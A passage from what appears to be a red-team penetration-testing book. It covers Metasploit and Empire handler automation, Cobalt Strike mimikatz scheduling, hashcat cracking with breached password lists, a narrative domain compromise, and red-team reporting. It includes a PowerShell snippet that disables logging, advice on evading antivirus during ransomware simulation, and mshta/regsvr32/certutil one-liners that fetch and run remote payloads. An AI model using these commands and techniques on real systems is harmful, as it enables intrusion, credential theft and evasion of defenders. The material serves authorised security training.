privilege migrate post exploitation (http://bit.ly/2vn1wfb) to our attack. t o configure the meterpreter shell so that it runs this payload on the initial connection from our compromised host, we need to specify an autorunscript parameter . feel free to add as many autorunsc ripts as you need to dump information about the system/network, move laterally , and more! creating a handler and autorunscript: create a handler file gedit handler .rc configure the handler and autorun scripts use multi/handler set payload windows/meterpreter/reverse_https set lhost 10.100.100.9 set lpor t 443 set autorunscript post/windows/manage/priv_migrate set exitonsession false set enablestageencoding true exploit -j start handler msfconsole -r handler .rc automating empir e empire has similar features to metasploit’ s resource files, which automate many of the repetitive tasks. first, we need to create a file (in our example, we will create a file called /opt/empire_autoload.rc) and then load it within our empire instance. in a separate terminal window , create a handler file: gedit /opt/empire_autoload.rc add all the post modules you want to execute: usemodule situational_awareness/network/powerview/get_user execute back usermodule situational_awareness/network/powerview/get_compu ter execute back within empire, load the autoload.rc resource file: agents autorun /opt/empire_autoload.rc powershell autorun show as you can see, when the agent connected, it automatically ran the get_user and get_computer powershell scripts. all the results of these scripts will be stored in the agent.log file. in this case, our agent name is n6lm348g, so our logs will be stored in /opt/empire/downloads/n6lm348g/agent.log. automating cobalt strike one of the main reasons that cobalt strike is so powerful is because of the aggressor scripts (https://www .cobaltstrike.com/aggressor script/index.html). with cobalt strike aggressor scripts, not only can you configure autorun style scripts, but you can also create very complex attacks. for example, i often come across the situation where we get on a shared workstat ion, like a lab or conference room box. one thing i may want our agent to do is run mimikatz every half hour to pull clear text credentials. with aggressor scripts, we can do all these actions and more. here is an example script that does just that: mimikatz-every-30m.cna (http://bit.ly/2ixgiel). aggressor collection scripts: https://github.com/bluscreenofjef f/aggressorscripts https://github.com/harleyqu1nn/aggressorscripts the futur e of automation lastly , there are some cool projects that are moving toward automation, smart compromi se, and apt attacks. i heavily believe that automation of attack is going to be the future of compromises and we will need the ability to test/validate our security controls. two tools i see having great potential in starting this automation trend are: portia - https://github.com/spiderlabs/portia caldera - https://github.com/mitre/caldera password cracking one of my newest and most favorite password lists comes from the recent 41gb password dump that contains 1.4 billion usernam e/passwords (http://bit.ly/2hqbyk8). now , i don't want to link directly to the torrent as it does contain a lot of sensit ive usernames (or emails) and associated passwords, but you can search for breachcompilation.tar .bz2 to find more information about it. please check with your laws before downloading this very sensitive information. i do recommend, instead of grabbing the original dump, that you just grab the password lists. i have taken the 41gb dump, stripped out all the usernames/emails, and made a list of just passwords. it is located here: http://thehackerplaybook.co m/get.php? type=thp-password. on my personal system, i am using 8x gigabyte gv-n108ttu rbo-1 1gd aorus geforce gtx 1080 ti turbo 11g graphic cards. for about $12,000, you can build one of your own, includes a chassis, ram, power supply , ssd, and gpus. of course, the chassis will require at least a 4u rackmount (for example: sys-4028gr-tr2) and plenty of power . although definitely not cheap, we are cracking about 472,000,000,000 hashes per second, and bruteforcing ntlm (windows) hashes . here is a hashcat benchmark of the eight gpus: hashmode: 1000 - ntlm speed.dev .#1.....: 59436.3 mh/s (63.16ms) speed.dev .#2.....: 58038.3 mh/s (64.70ms) speed.dev .#3.....: 59104.4 mh/s (63.55ms) speed.dev .#4.....: 59123.0 mh/s (63.52ms) speed.dev .#5.....: 58899.7 mh/s (63.74ms) speed.dev .#6.....: 59125.8 mh/s (63.51ms) speed.dev .#7.....: 59256.3 mh/s (63.36ms) speed.dev .#8.....: 59064.5 mh/s (63.56ms) speed.dev .#*.....: 472.0 gh/s for those who can't afford a massive gpu rig, there are other options. although still not cheap, you can look into cracking in the cloud . recently , amazon has integrated tesla gpus (not the car) http://www .nvidia.com/object/tesla-servers.html, which are more powerful than the 1080t is. there is a great article on the medium about setting up your own cracking servers utilizing these gpus: https://medium.com/@iraklis/running-hashcat-v4-0-0-in-amazons-awsnew-p3-16xlar ge-instance-e8fab4541e9b. statics from iraklis mathiopoulos article: hashmode: 1000 - ntlm: speed.dev .#1.....: 79294.4 mh/s (33.81ms) speed.dev .#2.....: 79376.5 mh/s (33.79ms) speed.dev .#3.....: 79135.5 mh/s (33.88ms) speed.dev .#4.....: 79051.6 mh/s (33.84ms) speed.dev .#5.....: 79030.6 mh/s (33.85ms) speed.dev .#6.....: 79395.3 mh/s (33.81ms) speed.dev .#7.....: 79079.5 mh/s (33.83ms) speed.dev .#8.....: 79350.7 mh/s (33.83ms) speed.dev .#*.....: 633.7 gh/s the total speeds for ntlm are about 34% greater than using the tesla gpu cards. the total cost of running aws is about $25 an hour. so, it is really up to you to figure out your own budget, requirements and goals. lab: recently , troy hunt at have i been pwned, released a sha1 list of password hashes that is about 5.3 gb compressed. this is a very large list from previous breaches and data dumps. this is a great lab to test your password-cracking skills: https://downloads.pwnedpasswords.com/passwords/pwnedpasswords-1.0.txt.7z as these gpus get faster and faster, passwords under 10 characters can be smart-bruteforced in a relatively reasonable timeframe. some of those might be cracked with good password masks, but for the most part, it comes down to password lists. using password lists from real breaches is one of the faste st ways to crack passwords larger than 12 characters. reviewing all the past breaches gives us a good look into how humans create passwords, common techniques to obfuscate passwords, and favorite words to use. using these lists with complex rule sets, allows us to crack passwords (som etimes greater that 25+ characters) at an imme nse speed. but remember , your password list is dependent on how well you build and maintain it. as a red teamer , we regularly track all the accoun ts we crack, analyze them, and add them to our lists. we also constantly monitor for new breaches, pastebin/pastie type sites, and more, to find new passwords. a great list to monitor can be found here: https://inteltechniques.com/osint/pastebins.html. favorite password lists: berzerk0's real-password-wp a password list: 18.6 gb uncompressed http://bit.ly/2ems6am berzerk0's dictionary-style list: 1 gb uncompressed http://bit.ly/2gxrnus xato's t en million passwords magnet:? xt=urn:btih:32e50d9656e101f54120ada3ce73f7 a65ec9d5cb hashes.or g https://hashes.or g/left.php multiple gigabytes and growing daily crackstation 15 gb uncompressed https://crackstation.net/files/crackstation.txt.gz weakpass tons of password lists https://weakpass.com/wordlist first20hours this repo contains a list of the 10,000 most common english words in order of frequency , as determined by n-gram frequency analysis of the google's t rillion word corpus. https://github.com/cyberspacekittens/google-10000english skullsecurity .org great older lists of passwords such as rockyou, myspace, phpbb https://wiki.skullsecurity .org/passwords daniel miessler's password compilation https://github.com/cyberspacekittens/seclists adeptus-mechanicus hash dumps http://www .adeptusmechanicus.com/codex/hashpass/hashpass.php with a combinat ion of good password lists, we can add rules on top of these lists to find even more password s. in terms of hashcat, rules define if any modifications need be injected into the wordlist. the best way to describe rules is with this easy-to-follow example. we can take and use the korelogicrulesappendy ears (http://contest2010.korelogic.com/rules.html) set of rules, which looks like the following: caz\"19[0-9][0-9]\" az\"19[0-9][0-9]\" caz\"20[01][0-9]\" az\"20[01][0-9]\" it will append the years from 1949 to 2019 in each and every password. if the password list contained the word \"hacker\", it would try to crack the hash for the string \"hacker1949\" all the way to \"hacker2019\". remember , the more complex rules you have, the more time it will take to finish going through all of the words in the word list. fortunately , we don't need to create our own rules as there are already plenty of great rules out there. of course, there are the default hashcat rules, which come from many older breaches, and common password manipulation techniques. these are a great place to start. kore rules come from a password competition by korelogic and is one of the other standards out there . two other rules that definitely take much longer , but have great detailed rule sets, are nsakey and the hob0rules. in the past, i would take all the rules, cat them into a single file, and unique the file. however , now, notsosecure actually does this for you. rules: hashcat rules https://github.com/hashcat/hashcat/tree/master/rules kore rules http://contest-2010.korelogic.com/rules-hashcat.html nsakey rules (one of my favorite) *forked https://github.com/cyberspacekittens/nsa-rules praetorian-inc hob0rules *forked https://github.com/cyberspacekittens/hob0rules notsosecure - one rule to rule them all *forked https://github.com/cyberspacekittens/password_cracki ng_rules gotta crack em all - quickly cracking as many as you can you have a huge list of passwords from the cyber space kittens compromise. with a limited amount of time, how can you get the best bang for the buck? the following walkthrough will guide you through the initial steps we perform to crack as many passwords as we can. although, we typically only need to find a couple of domain admin/ldap admin/enterprise admin accounts, my ocd tendencies drive me to try and crack all the passwords. before you start, you really need to understand the password format your hashes. hashcat has a great list of example hashes and what they look like here: http://hashcat.net/wiki/doku.php?id=example_hashes. once you understand the hash type, it is always good to do some initial test runs to figure out how fast or slow the password hashing algorithm is. this will make a huge difference in your password approach. for example, when looking at windows hashes, we see that ntlm (windows) performs about 75,000 mh/s. while a common linux hash, sha-256, perfor ms at a rate of about 5,000 mh/s. this means for a sha-256 hash, your gpu can guess 5,000,000,000 times a second . this can seem like a lot, but when you have huge wordlists and large rulesets, it might not be enough power . this is because the algorithm for sha-256 is pretty slow and expensive to compute compared to something like ntlm, which can do 75,000,000,000 hashes per second. in our case, we are going all out, because why not? we will be using eight 1080ti gpus and using a fast hash dump of ntlm. cracking the cyberspacekittens ntlm hashes: after getting domain admin access, you used your dcsync attack to dump all the hashes from the domain controller . your goal now is to try to crack as many hashes as you can. you know that you will be able to use these accounts in future campaigns and show your victim company the poor password practices they utilize. first, we save all the ntlm windows hashes in a file called cat.txt. to make the output easier for the reader , we are going to omit the initial hashcat executio n commands. every command execution will start with \"hashcat -w 3 -m 1000 -o hashes.cracked ./hashes/cat.txt\", which states: hashcat: run hashcat -w 3: using the tuned profile -m 1000: hash format is ntlm -o hashes.cracked: the output of the results into a file ./hashes/cat.txt: where our hashes are stored so, whenever you see the [hashcat] string, replace it with the following command: \"hashcat -w 3 -m 1000 -o hashes.cracked ./hashes/cat.txt”. now , let’s crack the ntlm hashes as quickly and efficiently as we can on our 8 gpu 1080ti rig. crack all passwords that are 7 characters or less by using the attack mode “brute-force” (-a 3) for any alpha, numeric, or special character (?a) from one to seven characters in length (-increment). [hashcat] -a 3 ?a?a?a?a?a?a?a --increment total t ime is about 5 minutes for 7 characters alpha/num/special. w e can do 8 characters, but we are looking at a 9-hour run. you can also limit the special characters to a select few (!@#$%^) to dramatically decrease the time and complexity . next, compare all the common password list dumps against our hashes. the first file (40gb_unique_file.txt) is a 3.2gb password file, which takes about 9 seconds to run: [hashcat] ./lists/40gb_unique_file.txt as we can see the speed for even the lar gest files takes a matter of seconds. t o improve ef ficiency , we can actually use the * operator and compare against every password list we have in our ./lists/ folder . [hashcat] ./lists/* next, based on the speed of the hashing algorithm, we can try different rule sets on a single password list file. w e are going to start with the rocky ou rule set that takes about 2 minutes and 9 seconds for these ntlm hashes: [hashcat] ./lists/40gb_unique_file.txt -r ./rules/rockyou-30000.rule note: the nsakey rule set with the 3gb file is about 7 minutes and “the one rule to rule them all” rule set from notsosecure takes about 20 minutes. this is when i circle back to the other password lists and rule set combinations. from the first pass of all the lar ge rule sets and large password breach lists, we generally get the 30%+ rate at a minimum. next, we can start adding characters to the right of the password lists to improve our chances of longer password requirements. the -a 6 switch command seen below will add every alpha/num/special character to the right of a password starting with one character all the way up to four characters: [hashcat] -i -a 6 ./lists/found.2015.txt ?a?a?a?a note: this takes about 30 minutes to get to four characters we can also add characters to the left of the password lists. the following command will add every alpha/num/special character to the left of a password starting with one character all the way up to four characters: [hashcat] -i -a 7 ?a?a?a?a ./lists/40gb_unique_file.txt note: this takes about 30 minutes to get to four characters hashcat utils: https://github.com/hashcat/hashcat-utils/releases. hashcat has a bunch of tools to help build better password lists. one example is combinator , which can take two or three different password lists and make combinations. using small lists is relatively quick. t aking our shortkrak list and combining it with itself results in a very fast crack: ./hashcat-utils-1.8/bin/combinator .bin lists/shortkrak.txt lists/shortkrak.txt > lists/comboshortkrak.txt taking lists like the top google 1000 words results in a file that is about 1.4 gb, so you will have to be careful of how lar ge of a file you choose. ./hashcat-utils-1.8/bin/combinator .bin lists/google_top_1000.txt lists/google_top_1000.txt > lists/google_top_1000_combo.txt note: taking a 4mb file and running combinator will result in a file that is greater than 25gb of storage. so, be cautious of how big these files are. many times, the passwords people use are not common dictionary words, but words based on their company , products, or services. w e can create custom password lists using the client websites. t wo tools that can assist are: brutescrape - https://github.com/cheetz/brutescrape burp w ord list extractor https://portswigger .net/bappstore/21df56baa03d499c8 439018fe075d3d7 next, take all of your cracked passwords, analyze them, and create masks using https://thesprawl.or g/projects/pack/: python ./p ack-0.0.4/statsgen.py hashes.password python ./p ack-0.0.4/statsgen.py hashes.password -minlength=10 -o hashes.masks python ./p ack-0.0.4/maskgen.py hashes.masks -optindex -q -o custom-optindex.hcmask run password cracking with your newly created masks: [hashcat] -a 3 ./custom-optindex.hcmask take your password lists through pipal to better understand base words (https://github.com/digininja/pipal): cd /opt/pipal ./pipal.rb hashes.password looking at this list, you might be able to figure out this company uses resetme12345 as a default password and could be located in michigan (detroit, tiger, football). where do you go from here? there is always great research being done on different password generation tools, analyses, and other techni ques to find faster ways to crack passwords. some starting resources: a deep learning approach for password guessing https://github.com/brannondorsey/passgan fast, lean, and accurate: modeling password guessability using neural networks https://www .usenix.or g/conference/usenixsecurity16/technicalsessions/presentation/melicher creative campaigns being on an internal red team for a corporation provides the opportunity for creative campaigns. one of my favorite campaigns is to simulate ransomware. in the past, we have been allowed to run simulated ransomware campaigns during the wannacry era. as cryptoware/ransomware is becoming more and more popular , we really need to be able to test our business recovery/disaster recovery procedures. we all witnessed this in real life with wannacry , which moved laterally through smb shares, utilized exploits like eternalblue, encrypted files, and even deleted all backups on the host system. as an it organization, the question we need to ask ourselves is, if one of our users clicked on that malware, what would have been the impact? could we have recovered user files, share files, databases, and more? the answer we hear all the time is, \"i think so...\", but without a red t eam to validate the processes in advance, we end up waiti ng until after our house is burnt to the ground to know the true answer . this is why i love having internal red teams for organizations. we can really prove and validate if security and it is working, all within a controlled environment. for this thp book, i did not include any of our examples of ransomware, due to the fact that it is very risky to do. i will leave it up to you to build the tools and test your clients in an approved method. simulated ransomware t ips: some or ganizations won't actually let you delete/encrypt files. for those companies, you can do a simulated ransomware breach. once the malware is executed, all it will do is scan the host/network for important files, read each file into memory , do a byte for random byte swap, send those bytes to a c2 server , and include metadata. this will demonstrate how many files you were able to touch, how much data you could exfiltrate out of their network before they detect the traf fic, and what files they could recover . look at other ransomware samples to see what file types they were encrypting. this could make for a more realistic campaign. for example, look at the file types from w annacry (https://gist.github.com/rain1/989428fa5504f378b993ee6efbc0b168). if you are going to \"encrypt\" malware, do it with something simple. it could be a standard aes with a key , a public/private x509 cert, or some sort of bitwise xor. the more complicated you make it, the higher the chance of not being able to recover the files. test, test, and test. the worst thing you could do is find out the company can't recover critical files and your decryption process does not work. many next gen a vs automatically block ransomware based on certain actions in a chain. for example, a normal detection that ransomware might perform is: scan the system for all files of type x, encrypt a file, delete the shadow volume copy , and disable backups. t o get around the detection process, try either slowing this activity down or finding ways to get these same tactics executed, but through a dif ferent processes. disabling ps logging as red teamers , we are always looking for unique ways to try and disable any sort of logging. although there are ways to perform these attacks, we still continually search for new and easy techniques. here is an example by leechristensen (https://github.com/leechristensen/random/blob/master/csharp/disableps logging.cs) that could be used to disable powershell logging: $etwprovider = [ref].assembly .gett ype('system.management.automation.t rac ing.psetwlogprovider').getfield('etwprovider','nonpublic,stati c'); $eventprovider = new-object system.diagnostics.eventing.eventprovider -ar gumentlist @([guid]::newguid()); $etwprovider .setv alue($null, $eventprovider); windows download file from internet command line if you do get command execut ion through an application vulnerability or have shell access through an office file or pdf, the next steps could be to download and execute your secondary malware. for those cases, there are windows \"features\" we can abuse to get the job done. most of these examples come from the great research of arno0x0x and @subtee (https://arno0x0x.wordpress.com/2017/1 1/20/windows-oneliners-todownload-remote-payload-and-execute-arbitrary-code/): mshta vbscript:close(execute(\"getobject(\"\"script:http://webserver/pa yload.sct\"\")\")) mshta http://webserver/payload.hta rundll32.exe javascript:\"\\..\\mshtml,runhtmlapplication\";o=getobject(\"scr ipt:http://webserver/payload.sct\");window .close(); regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll certutil -urlcache -split -f http://webserver/payload payload certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & c:\\w indows\\microsoft.net\\framework64\\v4.0.30319\\installut il /logfile= /logt oconsole=false /u payload.dll certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe these are just a few examples, but there are plenty more method s of getting your secondary code execution through a command line. it is up to you to find the other techniques to hide from traditional logging. getting system from local admin getting from a local administr ator account to system can be done in a variety of ways. the most common way, of course, is using metasploit's getsystem, but that isn't always available. decoder -it (https://github.com/decoder -it/psgetsystem) created an awesome powershell scrip t to go from a local administrative powershell prompt to system by creating a new process which sets its parent pid of that new process to be owned by system. this powershell can be found here: https://github.com/decoder -it/psgetsystem and executed with the following: ps> . .\\psgetsys.ps1 ps> [myprocess]::createprocessfromparent(<process_run_by_syste m>,<command_to_execute>) retrieving ntlm hashes without touching lsass elad shamir performed extensive research and was able to figure out how to grab ntlm hashes without ever having to touch lsass. prior to this attack, touching lsass to gain hashes via mimikatz was limited by credential guard in windows 10 enterprise and windows server 2016. elad developed an attack called internal monologue attack, that does the following: disable netntlmv1 preventive controls by changing lmcompatibilitylevel, ntlmminclientsec and restrictsendingntlmt raffic to appropriate values, as described above. retrieve all non-network logon tokens from currently running processes and impersonate the associated users. for each impersonated user , interact with ntlm ssp locally to elicit a netntlmv1 response to the chosen challenge in the security context of the impersonated user . restore the original values of lmcompatibilitylevel, ntlmminclientsec and restrictsendingntlmt raffic. [https://github.com/eladshamir/internal-monologue] building training labs and monitor with defensive tools one of the challenging parts of testing our malware is that we need to set up an environment for testing very quickly . an awesome tool that chris long built called detection lab (https://github.com/clong/detectionlab) is a collection of packer and vagrant scripts that allows you to quickly bring a windows activ e directory online. this tool comes complete with a collection of endpoint security tooling and logging best practices. detection lab consists of four total hosts (https://medium.com/@clong/introducing-detection-lab-61db34bed6ae): dc: a w indows 2016 domain controller wef: a w indows 2016 server that manages w indows event collection win10: a w indows 10 host simulating a non-server endpoint logger: an ubuntu 16.04 host that runs splunk and a fleet server c o n c l u s i o n with red teams, tips and tricks are part of our craft. we have to continually research for better ways to attack users, systems, and evade detection. there is no magic button. it requires hours to years of practice, sweat, and tears. 9 two-minute drill - from zero to hero with the clock ticking down, it is the last day of testing and you haven’ t had much success from the outside. y ou feel the pressure mounting as you need to gain access into the environment, understand their corporate layout, get to sensit ive files/code, pivot to different users and networks, and ultimately break into the classified cyber space kittens program. y our mission was to steal the new rocket secrets and you cannot fail . . . it is time for the twominute drill. with very little time left on the clock, you need to move the ball from the 10 yard line, break through all the defensive prote ction, clean your tracks, and make it down 90 yards to the touchdown zone. 10 yard line you go back through all of your notes to figure out what migh t have been missed. one of the web scrape screen shots captures your eye . . . it is a forum website for csk. you weren't able to find any vulnerabilities in the application, but notice that the csk forum is used by both employees and public users to post questions, comments, and other things abou t their space program. you scrape all of the users you can find on the site that look like they belong to company accounts. you then pull out your trusty list of passwords. you run a brutef orce attempt on all these accounts with commonly used passwords and variations. slowly , you see your python script going . . . failed . . . failled . . . failed . . . password found! you laugh as you see that one of the users, chris catfield, used the password “summer2018!”. that was just too easy you think to yourself. next, you log into the forum as chris, read through all his private message s and posts to figure out the best method to get your initial foothold. you see that chris regularly talks to another intern al employee on the forum, neil pawstrong, about the space program. it looks like they are not really friends , but have a good working relationship. this is good as it will make the next phish a trusted attack. using chris' account, we already have the rapport between the two users and the likelihood of success is great. 20 yard line you debate whether or not you should send neil a custom malware payload, as that might be too obvious. instead, you send a link to a cat photo webpage that you have stood up with the message, “hey neil, i know you love cats! check out this page i made!” a few minutes later, you get a message back on the forum site from neil that says, \"lol, i love space cats!\" little did neil realize that the webpage he visited had a custom javascript payload that ran code on his machine to scan his internal csk network and compromise unauthenticated jenkins and tomcat webservers. within a few seconds, you start to get empire payloads back and let out a sigh of relief. 30 yard line as your senses tingle, you know it is only a matter of time before the blue team starts putting in firewall/dns/host blocks, so you have to move quickly . fortunately , you have already set up the automation to do a lot of the dirty work. the compromised host beacon activates and starts to run tools like bloodhound, look for local passwords, set the registry bit to capture mimikatz lsass passwords, run spn and dump all kerberos tickets, and of course set up persistence in scheduled tasks. 40 yard line you know that you need to move quickly off this initial box. you take all the kerb eros tickets and dump them into hashcat to start cracking. it's a good thing you found those extra bug bounties to buy a couple of 1080ti gpus. as they start cracking, you see some service accoun t passwords popping up, but you don't have time for those yet. you review the bloodhound output and realize that the compromised box belongs to neil pawstrong and that his ad account has access to buzz clawdrin's box. using wmi, you remotely spawn another payload onto his system and migrate into a process owned by buzz. 50 yard line luckily for you, you are a local administrator on buzz's box as well, which means they must do a lot of joint work. using the bloodhound output, you traverse through the network to the csk-lab box, but realize that you don't have a local administrativ e account on this system. no worries, you load up the powerup powershe ll script and look for misconfigurations on that system which could allow you to get to local admin. just as you thought, there are a ton of unquo ted paths for service binaries and you have the ability to write your own payload there. you quickly create a new malicious binary that can now be triggered by the local system service. 60 yard line you get a new cobalt strike payload on your secondary c2 box, which allows you to maintain access even if they find parts of your campaign. taking this new connection as system, you pillage through the box and find numerous credentials in text files, stored in browsers, configured in winscp , and more. this shared box is a gold mine and has connectivity to multiple servers and databases. you notice that this machine is on a different vlan . it looks like this system has access to multiple systems in this network that neil could n’t see before. you run through your commands again, running bloodhound to understand what systems you see. you notice that many of these systems behind this network do not have access to the internet, so you can't run http beacons. howeve r, since you are using cobalt strike (https://www .cobaltstrike.com/help-smb-beacon), you know it has a great feature that tunnels your compromis ed systems through named pipes (smb). this means that any additional systems that are compromised in the lab network vlan, will route through the csklab box to get out to the internet. additionally , from running systeminfo and grabbing windows patch levels, you notice that these boxe s, which are all part of this semi-isolated network, aren't getting updates. it looks like the client machines are all running windows 7 and haven't been patched for eternalblue. 70 yard line through the csk-lab box, you use your modified eternalblue exploit to spawn smb beacon payloads on numerous windows 7 systems in the lab network. with all the new shells, you start pillaging them for information. you notice that one of the systems has active connections to a remote microsoft sql server named restricted. you try all of the accounts on the lab netw ork, but none of the usernames and passwords work for this database. stumped, you go back through all of your notes and realize . . . you forgot about your kerberos tickets! you ssh into your cracking box, review the output, and find the ticket linked to the restricted database. a huge wave of relief passes over you as you find the password to that service account! 80 yard line you log into the restricted db and dump the whole database. you are tempted to read it right on the spot, but you know time is limited. you use some of your powershell-fu to compress and encrypt the dump, then slowly exfiltrate betwee n the different compromised systems, and finally move it off their network onto your c2 server . you did it, you tell yourself, but as you slowly fall out of the happy dance zone, you realize there is still work left to be done. you go back to your different bloodh ound dumps and notice the path through purri gagarin's machine, who is part of the helpdesk group. awesome—we will be able to use this to remote connect either to a domain admin's box or through windows ace, then we can reset the password of a domain admin to a password of our choice. we go ahead and reset the passw ord of the domain admin , elon muskkat, and spawn a new payload as a full domain admin! 90 yard line the last thing we need to do is dump all the hashes from the domain controller , set up additional backdoors, and leave our calling card. instead of using the loud method (shadow volume copy) to get all the domain hashes, you run mimikatz's dcsync to pull all the user hashes, including the krbtgt ticket. we now have the golden ticket! if we ever decide to come back into the network, we can create our own kerberos tickets and move straight back to domain admin. to continue with more backdo ors, we spread all of our techniques on different boxes. we set sticky keys on one of the user systems; use backdoorfactory techniques to hide our malware in common binaries on another system;. set a scheduled task to run once a week to connect back to one of our subdomains; take one of the segmented lab boxes and replace a useless running service with a dnscat binary; and drop a couple of payloads in dif ferent systems’ startup folders. luckily for us (but unlucky for them), we haven't been caught yet. however , remember the purpose of the red team assessment is to see how quickly they can identify malicious activity (which they didn't), and how quickly they perform ir/forensics and mitigate all the activity . so, in your last ditch attempt to trigger the blue team, you run https://github.com/empireproject/empire/blob/master/data/module_source/t rollsploit/get-rickastley .ps1, enjoy a good laugh, and close your laptop. mission accomplished. touchdown! 10 post game analysis - reporting in the prior thp books, we had examples on how to write penetration test reports and provided numerous sample templates. these are great for the standard week style penetration test engagements, but do not translate as well for red team campaigns. as stated throughout the book, the main focus for red teams is not to identify vulnerabilities per se (although usually part of the campaign), but to test the people, the tools, the processes, and the skillsets of your employees. if your company was attacked and successfully compromised by an actor set or bad guy, what type of grade would you give yourself? i have always been against using gap assessment scores, iso scores, maturity model scores, standard risk analysis, heat graphs, and similar type reports to give a real-world view of your company's security program. personally , i love to see when companies implement controls from prior red team campaigns to test if progress is really being made. for example, for a phishing campaign using similar doppelganger style domains, we have seen companies enable some of the following: alert on domains similar to their company using dnstwist a trusted list of external email domains. anything external that does not match will append a header to those emails visible to your end user, saying that it is an external (non-company), nonapproved email source. this will help your users identify phishing easier . any links in emails that come from domains that are uncategorized in the proxy should, at a minimum, have a click through and alert the user that it is uncategorized. disallowing office macro attachments, forcing protected view , and sandboxing documents. this is just a small number of easy things a company could implement that could stop an attack. remember , red teamers only need to find one hole to potentially compromise an environment. but, at the same time, blue teamers need to only identify one of the ttps (tactics, techniques, and procedures) of an attacker to potentially stop a compromise. therefore, the question now becomes, if one of these ttps does alert from your toolset, how quickly will your ir teams see it and react to it? so what goes in a red team style report? since red teams are still pretty new and there is currently no standard report template, we can just customize it to the client's needs. from my perspective, since we may try to get into an environment multiple times (and get caught a few times) during a full campaign, we want show the good with the bad. in terms of taking notes during the campaign, many of the tools like empire and cobalt strik e, have really good logs of the activities during a campaign, but those might not always be adequate. what i have found to be extremely useful for our team’ s campaigns is to stand up a simple web server to record each of the activities a red team member performs. only the most basic information is collected during an engagement, which includes the specific event, servers, descriptions, impacts, any alerts, and screenshots. most red teamers/penetration testers hate taking notes and something like this provides an easy way to track the activity . once a campaign is finished, we take all of our notes and combine it to build a red team report that tells a story . the main componen ts in a red team report may include: introduction/scope: this section needs to clearly state the goals of the campaign. for example, we have had customers ask us to get to specific data, get to domain admin, get pii, get ip , or find a flag on a server in their production network. indicators: it is extremely helpful for ir/forensics teams to go backwards after an engagement. w e also want to identify where their tools or sensors might be lacking, disabling them to perform forensics or detect malicious activity . therefore, we want to give indicators like ip addresses of c2 servers, domains used, md5/sha1 hashes of binaries, email addresses and ip information, list of victims that were phished, and any other information that might help the forensics/ir team. timeline of attack: this is one of the most important parts of a red t eam campaign and where taking good notes pays of f. the timeline should adequately state all the major activities, any ttps that triggered an alert, and major campaign movements. this will allow the blue t eam to compare their timelines and notes to see what gaps they missed. how often in a real attack can you ask the bad guys about everything they did? this is extremely beneficial for the defensive teams to see. an example timeline might look like this: time t o detect (ttd)/t ime t o mitigate (ttm): this is usually where we can work with the blue t eam report to build statistics on ttd/ttm. t ogether , we want to identify how much time it took for the teams to discover each of the multiple intrusions; how much time passed, if any , before a scanning event triggered an investigation; and how much time it took for the blue t eam to identify the phishing campaigns. the second part should discuss statistics regarding the amount of time that passed before actions were taken. if there were c2 communications that were alerted on or phishing that was identified, how long before the domains were blocked on the firewall or dns servers? w e often see where companies might be good at blocking domains, but quickly fail when the c2 servers communicate over ip (or vice versa). w e want to make sure we track this activity and identify it for our customers. another great ttm measurement is how quickly they can isolate a confirmed compromised system. as malware becomes more and more automated, we need to start utilizing smart and automated processes to isolate systems or parts of the network from the rest of the or ganization. feedback from the ir/forensics staf f: one of my favorite things to document is feedback from the blue t eams on how they thought the overall campaign went from a defensive perspective. what i am looking for is if they felt like they followed policy , if the incident lead person drove the investigations, if management got too involved, how security interacted with it to make any it -related changes (firewall blocks, dns modifications, and so on), and who panicked or stayed too calm. as mentioned previously , the purpose of red t eams is not about finding vulnerabilities or compromising an environment (although that's the fun part); it is about improving an organization's overall security program and proving that certain gaps exist in their environment. many companies these days are too overconfident in their security programs, so they don't make changes until they have been breached. w ith red t eams, we can simulate the breach and encourage change without a real-life incident. continuing education so the million dollar question i always get is, what do i do now? i have read all the thp books, taken different training courses, and attended a couple of confe rences. the best advice i can give now is that you should start working on small projects and contributing to the security community . this is the best way to really test your skills and up your game. some ideas that could help: set up a blog and your own github account: you should be writing about all of your adventures and learnings. although, you are sharing it with the world, it is really more for your own growth. having to blog about the things you are learning will help you improve your writing, better explain vulnerabilities/exploits in an easy-to-understand fashion, and ensure you know the content well enough to explain it to the world. your r esume should be your github account: i always tell my students that your github account (or blog) should be able to stand on its own. whether it is just numerous small security projects, such as making tools more ef ficient and ef fective, or your own security project, your work should speak volumes on github. speaking at local confer ences: speaking can be extremely daunting, but it puts you in leagues above other people if you have it on your resume. where can you find places to speak? i would start at your local meetups (meetup.com) and find groups to get involved with. they are usually small and everyone is generally pretty friendly . if you are in the southern california area, i founded and currently run lethal (meetup.com/lethal), which is a free community-driven security group, where dif ferent members present once a month. in any case, get involved! bug bounties: no matter if you are on the of fensive or defensive side, bounty programs can really help you step up your game. bug bounty programs like hackerone, bugcrowd, and synack are free to sign up. not only can you make decent money , but you can also legally hack their sites (staying within the scope of their program, of course). captur e the flag competitions: i know it is hard to find time to do all of these things, but i always tell my students that security is not a job—it is a lifestyle. go on ctft ime.or g, pick a few ctfs throughout the year , block of f those weekends, and hack away . trust me, you will learn more in a ctf weekend than any class can teach you. get with your friends and build out a lab: it is hard to practice realistic scenarios without having a test lab that replicates a corporate environment. w ithout this test environment, you won't really understand what is happening behind the scenes when running all the of fensive tools. therefore, it is imperative to build a full lab with vlans, active directory , servers, gpos, users and computers, linux environments, puppet, jenkins, and all the other common tools that you might see. learn fr om the bad guys: for red t eams, this is one of the most important factors. our campaigns should not be theoretical, but a replication of another real attack. keep your eyes open for the latest apt reports and make sure to understand how the adversaries are changing their attacks. subscribe to the hacker playbook: to keep up with the latest thp news, please subscribe here: http://thehackerplaybook.com/subscribe/. training: if you are looking for some training, check us out at http://thehackerplaybook.com/training/. about the author peter kim has been in the information security industry for more than 14 years and has been running penetration testing/red teams for more than 12 years . he has worked for multiple utility companies, fortune 1000 entertainment companies, government agencies, and large financial organizations. although he is most well-known for the hacker playbook series, his passions are buildin g a safe security community , mentoring students, and training others. he founded and maintains one of southern california's largest technical security clubs called lethal (www .meetup.com/lethal), performs private training at his warehouse lethal security (lethalsecurity .com), and runs a boutique penetration testing firm called secure planet (www .securepla.net). peter's main goal with the hacker playbook series is to instill passion into his readers and get them to think outside the box. with the ever-changing environment of security , he wants to help build the next generation of security professionals. feel free to contact peter kim for any of the following: questions about the book: book@thehackerplaybook.com inquiries on private training or penetration t ests: secure@securepla.net twitter: @hackerplaybook special thanks contributors walter pearce bill eyler michael lim brett buerhaus tom gadola kristen kim ann le kevin bang tony dow special thanks mark adams 